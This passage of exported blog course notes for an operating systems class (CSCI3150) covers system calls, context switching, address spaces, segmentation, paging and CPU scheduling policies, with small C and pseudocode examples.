<li>gaining access to more system resources like CPU or memory</li>
</ul>
</li>
<li>The running program should be <font color="F54747">limited</font>, otherwise the OS would not be <font color="F54747">in control of anything</font> (it just becomes a library).</li>
<li>There should be something to isolate the applications and OS system, not allow the process touches the other processes’ address space.</li>
</ul>
</li>
<li><p><strong>Solution</strong>: </p>
<ul>
<li><p>Using protected control transfer to control users’ behaviors.</p>
<ol>
<li><p><font color="3A75EA"><strong>User Mode</strong></font>: Applications do not have full access to hardware resources.</p>
</li>
<li><p><font color="3A75EA"><strong>Kernel Mode</strong></font>: The OS has access to the full resources of the machine.</p>
</li>
</ol>
<ul>
<li>There are some privileged instructions</li>
<li>If users execute those privileged instructions under user mode, the system can limit the users’ behaviors.</li>
<li>Users can only execute those privileged instructions under kernel mode through system call.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="System-Call"><a href="#System-Call" class="headerlink" title="System Call"></a>System Call</h3><ul>
<li>Allow the users utilize the sysyem services through system calls.</li>
<li>It allows the kernel to <font color="F54747">carefully expose</font> certain <font color="3A75EA">key pieces of functionality</font> to user program, such as,<ul>
<li>accessing the file system</li>
<li>creating and destorying processes</li>
<li>communicating with other processes</li>
<li>allocating more memory</li>
</ul>
</li>
<li>Users can only call those system calls to get the services.</li>
</ul>
<ol>
<li><p><strong>Trap Instuction</strong></p>
<ul>
<li>switch from user mode to kernel mode (raise the privilege level to kernel mode).</li>
</ul>
</li>
<li><p><strong>Return-from-trap Instruction</strong></p>
<ul>
<li>return into the calling user program (reduce the privilege level to user mode).</li>
</ul>
</li>
</ol>
<h3 id="Limited-Direction-Execution"><a href="#Limited-Direction-Execution" class="headerlink" title="Limited Direction Execution"></a>Limited Direction Execution</h3><h4 id="Execution-Procedure-1"><a href="#Execution-Procedure-1" class="headerlink" title="Execution Procedure"></a>Execution Procedure</h4><img src="https://p.ipic.vip/0u1e9k.png" width="500px">

<h4 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h4><ul>
<li><strong>Problem</strong>: <font color="F54747"><strong>Switching between Processes</strong></font><ul>
<li>How can the OS <font color="F54747">regain control</font> (重新獲取控制權) of the CPU so that it can switch between the processes?</li>
</ul>
</li>
</ul>
<ol>
<li><p><font color="3A75EA"><strong>Cooperative Approach: Wait for system call</strong></font></p>
<ul>
<li>Processes periodically give up the CPU by making system calls, like <code>yield</code> (i.e., wait until the running process gives up the control).<ul>
<li>The OS decides to run other tasks.</li>
<li>Application also transfers control to the OS when they do something illegal, such as, divide by zero.</li>
</ul>
</li>
<li><font color="F54747">Problem: a process may get stuck in an infinite loop, if this happened, we need to reboot the machine.</font></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Non-cooperative Approach: The OS takes control</strong></font> through a <font color="F54747"><strong>timer interrupt</strong></font>.</p>
<ol>
<li><p>During the boot sequence, the OS starts the <font color="3A75EA">timer</font>.</p>
</li>
<li><p>The timer raises an interrupt every specific milliseconds.</p>
</li>
<li><p>When the interrupt is raised</p>
<ul>
<li>The currect running process is halted.</li>
<li>Save enough of the state of the program.</li>
<li>A pre-configured interrupt handler in the OS runs.</li>
</ul>
</li>
<li><p>After that, the <font color="3A75EA">scheduler</font> can make a decision:</p>
<ul>
<li>Continue running the current process or switch to different process.</li>
<li>If the decision is switch, the OS will execute <font color="F54747"><strong>Context switch</strong></font>.</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="Context-Switch"><a href="#Context-Switch" class="headerlink" title="Context Switch"></a>Context Switch</h3><ol>
<li><p><font color="3A75EA"><strong>Save the value of necessary registers</strong></font> for the current process onto its kernel stack.</p>
</li>
<li><p><font color="3A75EA"><strong>Restore the register values</strong></font> for the soon-to-be-executing process from its kernel stack.</p>
</li>
<li><p><font color="3A75EA"><strong>Switch to the kernel stack</strong></font> for the soon-to-be-executing process.</p>
</li>
</ol>
<ul>
<li>Examples: If we want to switch from process A to process B<ol>
<li>save the necessary registers of process A onto its kernel stack</li>
<li>restore the registers for process B from its kernel stack</li>
<li>switch to process B kernel stack</li>
</ol>
</li>
</ul>
<img src="https://p.ipic.vip/bis8ht.png" width="500px">
<img src="https://p.ipic.vip/wsk38g.png" width="500px">
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing Memory (Address Space)</title>
    <url>/myBlog/2022/11/18/2022/CSCI3150/2022-11-18-CSCI3150-Virtualizing-Memory-Address-Space%20copy/</url>
    <content><![CDATA[<h2 id="Memory-Virtualization"><a href="#Memory-Virtualization" class="headerlink" title="Memory Virtualization"></a>Memory Virtualization</h2><ol>
<li><p>Introduction</p>
<ul>
<li>OS virtualizes its physical memory</li>
<li>OS provides an illusion memory space per each process</li>
</ul>
</li>
<li><p>Benefit</p>
<ol>
<li>Ease to use in programming</li>
<li>Memory efficiency in items of time and space</li>
<li>Isolate the processes and OS, protect from <font color="3A75EA">errant accesses</font> of other processes</li>
</ol>
</li>
<li><p>Multiprogramming and Time Sharing</p>
<ul>
<li><p>Load <font color="3A75EA">multiple processes</font> in memory</p>
<ol>
<li>execute one process for a while</li>
<li>switch processes between them in the memory</li>
</ol>
<ul>
<li>increase utilization and efficiency</li>
</ul>
</li>
<li><p>But it causes an important <font color="F54747">protection problem</font> as the errant memory accesses from other processes</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h89c6pws46j30rk11uwju.jpg" width="300px"></li>
</ul>
</li>
</ol>
<h3 id="Address-Space"><a href="#Address-Space" class="headerlink" title="Address Space"></a>Address Space</h3><ul>
<li><p>OS creates an abstraction of physical memory</p>
<ul>
<li>The address space contains all about a running process  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ipm6a56uj30kg0veq6k.jpg" width="250px"></li>
</ul>
</li>
<li><p>Structure:</p>
<ol>
<li>Code: Instructions</li>
<li>Data: Global or static local variables</li>
<li>Heap: Dynamically allocate memory (<code>malloc</code>)</li>
<li>Stack: <ul>
<li>Store return address or values (parameters)</li>
<li>Contain local variables arguments to routines</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Virtual-Address"><a href="#Virtual-Address" class="headerlink" title="Virtual Address"></a>Virtual Address</h3><ul>
<li>Every address in a running program is virtual (OS translates the virtual address to physical address)  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of code  : %p\n&quot;</span>, (<span class="type">void</span> *) main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of heap  : %p\n&quot;</span>, (<span class="type">void</span> *) <span class="built_in">malloc</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="type">int</span> x = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of stack : %p\n&quot;</span>, (<span class="type">void</span> *) &amp;x);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Outputs: Code &gt; Heap &gt;&gt; Stack</span></span><br><span class="line"><span class="comment">        location of code  : 0x102937ed8</span></span><br><span class="line"><span class="comment">        location of heap  : 0x132606810</span></span><br><span class="line"><span class="comment">        location of stack : 0x16d4cb42c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Address-Transition"><a href="#Address-Transition" class="headerlink" title="Address Transition"></a>Address Transition</h2><ul>
<li><p>Relocation Address Space</p>
<ul>
<li>Every process has it own address space (start at address 0).</li>
<li>The OS wants to place the process somewhere else in physical memory, not at address 0.</li>
</ul>
<ol>
<li>Single Process</li>
</ol>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iqa3asucj31dd0u0dlw.jpg" width="500px">

<ol start="2">
<li>Multiple Processes<ul>
<li><font color="3A75EA">Base register</font>: store the location of the process in physical memory, so that it can easily address the memory by adding the base register.</li>
<li><font color="3A75EA">Bounds register</font>: remember the maximum length of address space.</li>
<li>It can prevent the process access the location out of the boundary.</li>
</ul>
</li>
</ol>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iq81env7j315b0u0wkj.jpg" width="400px"></li>
</ul>
<h3 id="Dynamic-Relocation"><a href="#Dynamic-Relocation" class="headerlink" title="Dynamic Relocation"></a>Dynamic Relocation</h3><ul>
<li>When a program starts running, the OS decides <font color="3A75EA">where</font> a process should be loaded <font color="3A75EA">in physical memory</font>.<ul>
<li><p>Set the base register a value<br>  $$ physical \thinspace address &#x3D; virtual \thinspace address + base $$</p>
</li>
<li><p>Every virtual address must <font color="F54747">not be negative or greater than bound</font><br>  $$ 0 \leq virtual \thinspace address &lt; bounds $$</p>
</li>
<li><p>Two ways of bounds register</p>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iqa3ww0aj31e50u0tf4.jpg" width="500px"></li>
</ul>
</li>
</ul>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><ol>
<li><p>Base</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ir7pmn5qj31am0iatb2.jpg" width="500px">
</li>
<li><p>Base + Bounds</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ir7r3ogbj31am0i6q5v.jpg" width="500px"></li>
</ol>
<h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><ul>
<li><p>The OS must take action to implement <font color="3A75EA">base-and-bounds</font> approach</p>
</li>
<li><p>Three critical junctures:</p>
<ol>
<li><p>When a process <font color="3A75EA">starts running</font>: Finding space for address space in physical memory.</p>
<ul>
<li><font color="F54747">free list</font>: a list of the range of the physical memory are <font color="F54747">not in use</font>. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfvowo3j31i00q842a.jpg" width="500px"></li>
</ul>
</li>
<li><p>When a process is <font color="3A75EA">terminated</font>: Reclaiming the memory for use.</p>
<ul>
<li>The OS must <font color="F54747">put the memory back</font> to the free list. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfu7fojj31i00n6dls.jpg" width="500px"></li>
</ul>
</li>
<li><p>When context <font color="3A75EA">switch occurs</font>: Saving and storing the base-and-bounds pair.</p>
<ul>
<li>The OS must <font color="F54747">save and restore</font> the base-and-bounds pair. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfshofsj31i00pctdi.jpg" width="500px"></li>
</ul>
</li>
</ol>
</li>
<li><p>Inefficiency</p>
<ol>
<li>Big chunk of free space</li>
<li>The free space takes up physical memory</li>
<li>Hard to run when an address space does not fit into the physical memory (e.g. 4KB space)</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing Memory (Segmentation and Paging)</title>
    <url>/myBlog/2022/11/26/2022/CSCI3150/2022-11-26-CSCI3150-Virtualizing-Memory-Segmentation-Paging/</url>
    <content><![CDATA[<h2 id="Segmentation"><a href="#Segmentation" class="headerlink" title="Segmentation"></a>Segmentation</h2><ul>
<li>Segment is <font color="3A75EA">a contiguous portion</font> of the address space of a particular length.<ul>
<li>Different segments: code, stack, heap.</li>
<li>Each segment can be placed in <font color="3A75EA">different part of physical memory</font>.<ul>
<li>base and bounds exist in each segment  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8isrvo2yzj31dr0u0dl6.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Address-Transition"><a href="#Address-Transition" class="headerlink" title="Address Transition"></a>Address Transition</h3><p>$$ physical \thinspace address &#x3D; offset + base $$</p>
<ul>
<li><p>The code segment starts at the <font color="3A75EA">virtual address 0</font> in address space.</p>
</li>
<li><p>Example:</p>
<ol>
<li><p>Code Segment: the offset of virtual address 100 is 100.</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8isuq8elcj31qk0rwn4d.jpg" width="500px">
</li>
<li><p>Heap Segment: the offset of virtual address 4200 is 104.</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8it14f3uzj31qk0ssdna.jpg" width="500px"></li>
</ol>
</li>
<li><p>Segmentation Fault</p>
<ul>
<li>If an illegal Address is referenced, the hardware detects that the address is <font color="3A75EA">out of bounds</font>.</li>
</ul>
</li>
</ul>
<h3 id="Referring-to-Segment"><a href="#Referring-to-Segment" class="headerlink" title="Referring to Segment"></a>Referring to Segment</h3><ul>
<li><p><strong>Explicit approach</strong></p>
<ul>
<li>chop up the address space into segments based on the <font color="3A75EA">top few bits</font> of virtual address.</li>
<li>Example: virtual address 4200 (<code>01000001101000</code>)  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itd4u9ulj31qk0b4ta8.jpg" width="400px">
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    SEG_MASK = 0x3000 (11000000000000)</span></span><br><span class="line"><span class="comment">    SEG_SHIFT = 12</span></span><br><span class="line"><span class="comment">    OFFSET_MASK = 0xFFF (00111111111111)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// get top 2 bits of 14-bit VA</span></span><br><span class="line">Segment = (VirtualAddress &amp; SEG_MASK) &gt;&gt; SEG_SHIFT</span><br><span class="line"></span><br><span class="line"><span class="comment">// now get offset</span></span><br><span class="line">Offset = VirtualAddress &amp; OFFSET_MASK</span><br><span class="line"><span class="keyword">if</span> (Offset &gt;= Bounds[Segment])&#123;</span><br><span class="line">    RaiseException(PROTECTION_FAULT)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    PhysAddr = Base[Segment] + Offset</span><br><span class="line">    Register = AccessMemory(PhysAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Stack Segment</strong></p>
<ul>
<li>Since stack grows backward, an <font color="3A75EA">extra hardware support</font>:<ul>
<li>The hardware checks which way the segment grows</li>
<li><code>1</code> - positive direction, <code>0</code> - negative direction  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itl1l7kcj31qk0n0792.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Sharing</strong></p>
<ul>
<li>Segment can be shared between address space by an <font color="3A75EA">extra hardware support</font>: <font color="F54747"><strong>Production bits</strong></font><ul>
<li>a few more bit to indicate permissions of <font color="3A75EA">read</font>, <font color="3A75EA">write</font> and <font color="3A75EA">execute</font> in each segment   <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itpg0fbrj31qk0cuq56.jpg" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Fragmentation"><a href="#Fragmentation" class="headerlink" title="Fragmentation"></a>Fragmentation</h3><ul>
<li><p><strong>External Fragmentation</strong>: some little holes of <font color="3A75EA">free space</font> in the physical memory that make difficulty to allocate new segments.</p>
</li>
<li><p><strong>Compaction</strong>: rearranging the exiting segments in physical memory, but it is costly.</p>
<ul>
<li>Stop the running process</li>
<li>Copy data to somewhere</li>
<li>Change segment register value  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8itxjpxplj31gs0u0gro.jpg" width="500px"></li>
</ul>
</li>
</ul>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Segmentation uses the base-bounds pair to represent the location and boundary of process in the physical memory<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iw3wu4gwj310n0u0afr.jpg" width="500px"></li>
</ul>
<h2 id="Paging"><a href="#Paging" class="headerlink" title="Paging"></a>Paging</h2><ul>
<li><p>Paging <font color="3A75EA">splits up</font> the address space into <font color="F54747">fixed-sized</font> unit called a <font color="F54747">page</font>.</p>
</li>
<li><p>With paging, physical memory is also split into some number of pages called a <font color="F54747">page frame</font>.</p>
</li>
<li><p><font color="3A75EA">Page table</font> per process is needed to <font color="3A75EA">translate</font> the virtual address to physical address.</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iu4scb3fj31j20u0te2.jpg" width="500px">
</li>
<li><p><strong>Advantages</strong></p>
<ol>
<li><p><font color="3A75EA">Flexibility</font>: </p>
<ul>
<li>Do not need to assume how heap and stack grow and be used.</li>
</ul>
</li>
<li><p><font color="3A75EA">Simplicity</font>: </p>
<ul>
<li>The page in address space and the page frame are same size (usually 4KB).</li>
<li>Easy to allocate and keep a free list</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Address-Transition-1"><a href="#Address-Transition-1" class="headerlink" title="Address Transition"></a>Address Transition</h3><img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iuj0y0taj31cs0u0afq.jpg" width="500px">

<ul>
<li><p>Two components in the virtual address</p>
<ol>
<li><font color="3A75EA">VPN</font>: virtual page number</li>
<li><font color="3A75EA">Offset</font>: offset within the page  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iumjzfwtj31uo090t9b.jpg" width="500px">
 
<ul>
<li>For a 64-byte address space with 16 bytes page.</li>
<li>We have $4 &#x3D; 2^2$ pages and and page size $16 &#x3D; 2^4$.</li>
<li>Therefore, we can use 6 bits to represent the address, where the first 2 bits are VPN, the rest are the offset.</li>
</ul>
</li>
</ol>
</li>
<li><p>Example:</p>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iumivlahj31sz0u0wgt.jpg" width="500px"></li>
</ul>
<h3 id="Page-Table"><a href="#Page-Table" class="headerlink" title="Page Table"></a>Page Table</h3><ul>
<li><p>The page table is just a data structure (array) that is used to map the virtual address to physical address.</p>
</li>
<li><p>The OS indexes the array by VPN and looks up the page-table entry.</p>
</li>
<li><p>Page Table Storage:</p>
<ul>
<li>Page tables can get very large:<ul>
<li>32-bit address ($2^{32} &#x3D; 4$GB) space with 4-KB pages and 20bits for VPN<br>  ($4$MB &#x3D; $2^{20}$ entries * $2^2$ bytes per table entry)</li>
</ul>
</li>
</ul>
</li>
<li><p>Common Flags of Page Table Entry</p>
<ol>
<li><font color="3A75EA">Valid Bit</font>: Indicating whether the particular transition is valid.</li>
<li><font color="3A75EA">Protection Bit</font>: Indicating whether the page could be read from, written to, or execute from.</li>
<li><font color="3A75EA">Present Bit</font>: Indicating whether this page is in physical memory or on disk.</li>
<li><font color="3A75EA">Dirty Bit</font>: Indicating whether the page has been modified since it was brought into memory.</li>
<li><font color="3A75EA">Reference Bit (Accessed Bit)</font>: Indicating that a page has been accessed.  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ivefbutkj31uo0aoabq.jpg" width="500px">
 
<ul>
<li><code>P</code>: present bit</li>
<li><code>R/W</code>: read &#x2F; write bit</li>
<li><code>U/S</code>: supervisor</li>
<li><code>A</code>: accessed bit</li>
<li><code>D</code>: dirty bit</li>
<li><code>PFN</code>: the page frame number</li>
</ul>
</li>
</ol>
</li>
<li><p>Access memory with paging</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Extract the VPN from the virtual address</span></span><br><span class="line">VPN = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT</span><br><span class="line"></span><br><span class="line"><span class="comment">// Form the address of the page-table entry (PTE)</span></span><br><span class="line">PTEAddr = PTBR + (VPN * <span class="keyword">sizeof</span>(PTE))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the PTE</span></span><br><span class="line">PTE = AccessMemory(PTEAddr)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if process can access the page</span></span><br><span class="line"><span class="keyword">if</span> (PTE.Valid == False) &#123;</span><br><span class="line">    RaiseException(SEGMENTATION_FAULT)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (CanAccess(PTE.ProtectBits) == False) &#123;</span><br><span class="line">    RaiseException(PROTECTION_FAULT)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Access is OK: form physical address and fetch it</span></span><br><span class="line">    offset = VirtualAddress &amp; OFFSET_MASK</span><br><span class="line">    PhysAddr = (PTE.PFN &lt;&lt; PFN_SHIFT) | offset</span><br><span class="line">    Register = AccessMemory(PhysAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>Disadvantage</strong>: Paging is too slow</p>
<ul>
<li>To find a location of the target PTE, the starting location of the page table is needed.</li>
<li>For every memory reference, paging requires the OS to perform one extra memory reference.</li>
</ul>
</li>
</ul>
<h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><ul>
<li>Paging divides the virtual address and physical memory into pages with same page size.</li>
<li>Use the page table to store the mapping PFN for each process.<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iw72ecnbj31170u07aq.jpg" width="500px"></li>
</ul>
<!-- <img src="" width="500px">
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Virtualizing CPU (Scheduling)</title>
    <url>/myBlog/2022/11/04/2022/CSCI3150/2022-11-4-CSCI3150-Virtualizing-CPU-Scheduling/</url>
    <content><![CDATA[<h2 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h2><h3 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h3><ol>
<li>Each job runs for <font color="3A75EA">same among of time</font>.</li>
<li>All jobs <font color="3A75EA">arrive at the same time</font>.</li>
<li>All jobs only use the <font color="3A75EA">CPU</font> (i.e., no I&#x2F;O operations).</li>
<li>The <font color="3A75EA">running time</font> of each job is known.</li>
</ol>
<h3 id="Scheduling-Metrics"><a href="#Scheduling-Metrics" class="headerlink" title="Scheduling Metrics"></a>Scheduling Metrics</h3><ol>
<li><p>Performance Metric: <font color="F54747"><strong>Turnaround Time</strong> (往返時間)</font></p>
<ul>
<li>The time at which <font color="3A75EA">the job completes</font> minus the time at which <font color="3A75EA">the job arrived</font> in the system.<br> $$T_{turnaround} &#x3D; T_{completion} - T_{arrival}$$</li>
</ul>
</li>
<li><p>Another Metric: <font color="F54747"><strong>Fairness</strong></font></p>
</li>
<li><p>New Metric: <font color="F54747"><strong>Response Time</strong></font></p>
<ul>
<li>The time from <font color="3A75EA">when the job arrives</font> to the <font color="3A75EA">first time it is scheduled</font>.<br> $$T_{response} &#x3D; T_{firstrun} - T_{arrival}$$</li>
</ul>
</li>
</ol>
<h2 id="Scheduling-Strategies"><a href="#Scheduling-Strategies" class="headerlink" title="Scheduling Strategies"></a>Scheduling Strategies</h2><h3 id="Simple-Strategies"><a href="#Simple-Strategies" class="headerlink" title="Simple Strategies"></a>Simple Strategies</h3><h4 id="First-In-First-Out-FIFO"><a href="#First-In-First-Out-FIFO" class="headerlink" title="First In First Out (FIFO)"></a><font color="F54747">First In First Out (FIFO)</font></h4><ul>
<li><p>a simple and easy to implement strategy.</p>
</li>
<li><p>Example:</p>
<ul>
<li>A arrived just before B which also arrived just before C.</li>
<li>Each job runs for 10 seconds.  <img src="https://p.ipic.vip/es9yk7.png" width="400px">
  $$T_{average\,turnaround} = \frac{10 + 20 + 30}{3} = 20s$$</li>
</ul>
</li>
<li><p>Problem: </p>
<ul>
<li>If we <font color="3A75EA">relax the assumption 1 (Each job runs for same among of time)</font>:<ul>
<li>A runs for 100 seconds, B and C run for 10 seconds each.  <img src="https://p.ipic.vip/yttjpe.png" width="400px">
  $$T_{average\,turnaround} = \frac{100 + 110 + 120}{3} = 110s$$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Shortest-Job-First-SJF"><a href="#Shortest-Job-First-SJF" class="headerlink" title="Shortest Job First (SJF)"></a><font color="F54747">Shortest Job First (SJF)</font></h4><ul>
<li><p>run the shortest job first, then the next shortest, and so on.</p>
</li>
<li><p>Example:</p>
<ul>
<li>A arrived just before B which also arrived just before C.</li>
<li>A runs for 100 seconds, B and C run for 10 seconds each.  <img src="https://p.ipic.vip/avf7iy.png" width="400px">
  $$T_{average\,turnaround} = \frac{10 + 20 + 120}{3} = 50s$$</li>
</ul>
</li>
<li><p>Problem: </p>
<ul>
<li>If we <font color="3A75EA">relax the assumption 2 (All jobs arrive at the same time)</font>:<ul>
<li>A arrives at t &#x3D; 0, B and C arrive at t &#x3D; 10.  <img src="https://p.ipic.vip/baycel.png" width="400px">
  $$T_{average\,turnaround} = \frac{100 + (110 - 10) + (120 - 10)}{3} = 103.3s$$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Shortest-Time-to-Completion-First-STCF"><a href="#Shortest-Time-to-Completion-First-STCF" class="headerlink" title="Shortest Time-to-Completion First (STCF)"></a>Shortest Time-to-Completion First (STCF)</h4><ul>
<li><p>Add a preemption to SJF, when a new job enters the system:</p>
<ol>
<li>Determine the remaining jobs and new job</li>
<li>Schedule the job which has the least time left</li>
</ol>
</li>
<li><p>Example:</p>
<ul>
<li>A arrives at t &#x3D; 0 and needs to run for 100 seconds.</li>
<li>B and C arrive at t &#x3D; 10 and need to run for 10 seconds.  <img src="https://p.ipic.vip/16zklv.png" width="400px">
  $$T_{average\,turnaround} = \frac{(120 - 0) + (20 - 10) + (30 - 10)}{3} = 50s$$</li>
</ul>
</li>
</ul>
<h4 id="Round-Robin-RR"><a href="#Round-Robin-RR" class="headerlink" title="Round Robin (RR)"></a>Round Robin (RR)</h4><ul>
<li><p>Run a job for a <font color="3A75EA">time slice</font>, and switch to the next job in the <font color="3A75EA">run queue</font> until the jobs are finished.</p>
</li>
<li><p>The length of the time slice must be a <font color="F54747">multiple of the timer-interrupt period</font>.</p>
</li>
<li><p><font color="F54747">Noted</font>: RR is fair, but performs poorly on performance metrics like turnaround time.</p>
</li>
<li><p>Example:</p>
<ul>
<li><p>A, B and C arrive at the same time and each of them run for 5 seconds.</p>
</li>
<li><p>In SJF:</p>
  <img src="https://p.ipic.vip/bkq1aw.png" width="400px">
  $$T_{average\,response} = \frac{0 + 5 + 10}{3} = 5s$$

</li>
<li><p>In RR:</p>
  <img src="https://p.ipic.vip/nx41d7.png" width="400px">
  $$T_{average\,response} = \frac{1 + 1 + 1}{3} = 1s$$</li>
</ul>
</li>
<li><p>Length of time slice</p>
<ul>
<li><p><font color="3A75EA">Shorter time slice</font></p>
<ul>
<li>Better response time.</li>
<li>The cost of context switching will dominate the overall performance.</li>
</ul>
</li>
<li><p><font color="3A75EA">Longer time slice</font></p>
<ul>
<li>Worse response time.</li>
<li>Reduce the cost of switching.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Incorporating I&#x2F;O</strong></p>
<ul>
<li><p>Relax the assumption 3 (All jobs only use the CPU).</p>
</li>
<li><p>When a job initiates an I&#x2F;O request:</p>
<ol>
<li>The job is blocked until the I&#x2F;O request completed.</li>
<li>The scheduler should schedule another job on the CPU.</li>
</ol>
</li>
<li><p>When the I&#x2F;O completes,</p>
<ol>
<li>An interrupt is raised.</li>
<li>The OS moves the process from the blocked state back to the ready state.</li>
</ol>
</li>
<li><p>Example:</p>
<ul>
<li>A and B need 50ms of CPU time each.</li>
<li>In every 10ms, A issues an I&#x2F;O request (takes 10ms).</li>
<li>B simply uses the CPU for 50ms and performs no I&#x2F;O request.</li>
<li>The scheduler runs A first.      <img src="https://p.ipic.vip/5yn1jh.png" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Multi-Level-Feedback-Queue"><a href="#Multi-Level-Feedback-Queue" class="headerlink" title="Multi-Level Feedback Queue"></a>Multi-Level Feedback Queue</h3><h4 id="Basic-Rules"><a href="#Basic-Rules" class="headerlink" title="Basic Rules"></a>Basic Rules</h4><ol>
<li><p>MLFQ has a number of distinct <font color="3A75EA">queues</font></p>
<ul>
<li>each queue is assigned a different priority level (優先次序).</li>
</ul>
</li>
<li><p>A job that is ready to run is on a <font color="3A75EA">signle queue</font></p>
<ul>
<li>a job on a <font color="F54747">higher priority</font> is chosen to run.</li>
<li>use round-robin scheduling among jobs in the same queue.</li>
<li>Rule 1: <font color="F54747">If Priority(A) &gt; Priority(B), A runs</font></li>
<li>Rule 2: <font color="F54747">If Priority(A) &#x3D; Priority(B), A and B run in RR</font></li>
</ul>
</li>
</ol>
<ul>
<li>Example:  <img src="https://p.ipic.vip/btp5ge.png" width="300px"></li>
</ul>
<h4 id="Change-Priority"><a href="#Change-Priority" class="headerlink" title="Change Priority"></a>Change Priority</h4><ul>
<li>MLFQ varies the priority of a job based on its observed behavior.</li>
<li>MLFQ priority adjustment algorithm:<ul>
<li>Rule 3: <font color="F54747">When a job enters the system, it is placed at the highest priority</font></li>
<li>Rule 4a: <font color="F54747">If a job uses up an entire time slice while running, its priority will be reduced</font></li>
<li>Rule 4b: <font color="F54747">If a job gives up the CPU before the time slice is up (e.g., I&#x2F;O request), it stays at the same priority level</font></li>
</ul>
</li>
</ul>
<h4 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h4><ol>
<li><p><font color="3A75EA">Single</font> Long-Running Job</p>
<ul>
<li>A three-queue scheduler with time slice 10ms. <img src="https://p.ipic.vip/vor93v.png" width="350px"></li>
<li>According to rule 4a, its priority will be reduce after one time slice.</li>
</ul>
</li>
<li><p>Along Came a Short Job</p>
<ul>
<li>Job A: a long-running CPU-intensive job</li>
